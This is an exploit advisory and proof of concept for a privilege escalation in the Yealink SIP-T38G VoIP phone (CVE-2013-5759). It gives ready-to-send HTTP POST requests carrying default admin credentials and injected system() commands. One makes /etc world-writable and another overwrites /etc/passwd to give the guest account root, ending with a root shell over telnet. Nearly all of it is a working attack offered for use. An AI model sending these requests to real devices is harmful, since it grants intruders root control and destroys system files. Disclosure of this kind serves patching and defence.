Title: Yealink VoIP Phone SIP-T38G Privileges Escalation
Author: Mr.Un1k0d3r & Doreth.Z10 From RingZer0 Team
Vendor Homepage: http://www.yealink.com/Companyprofile.aspx
Version: VoIP Phone SIP-T38G
CVE: CVE-2013-5759

Description:

Using the fact that cgiServer.exx run under the root privileges we use the
command execution (CVE-2013-5758) to modify the system file restriction.
Then we add extra privileges to the guest account.

POC:

Step 1 - Changing /etc folder right to 777:

POST /cgi-bin/cgiServer.exx HTTP/1.1
Host: 10.0.75.122
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

system("/bin/busybox%20chmod%20-R%20777%20/etc")

Step 2 - Change guest user uid:

POST /cgi-bin/cgiServer.exx HTTP/1.1
Host: 10.0.75.122
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Authorization: Basic YWRtaW46YWRtaW4=
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

system("echo "root:x:0:0:Root,,,:/:/bin/sh
admin:x:500:500:Admin,,,:/:/bin/sh
guest:x:0:0:Guest,,,:/:/bin/sh\" > /etc/passwd
")

Step 3 - Connect back using telnet and guest account (password is guest):

# id
uid=0(root) gid=0(root)

Enjoy your root shell :)

-- 
*Mr.Un1k0d3r** or 1 #*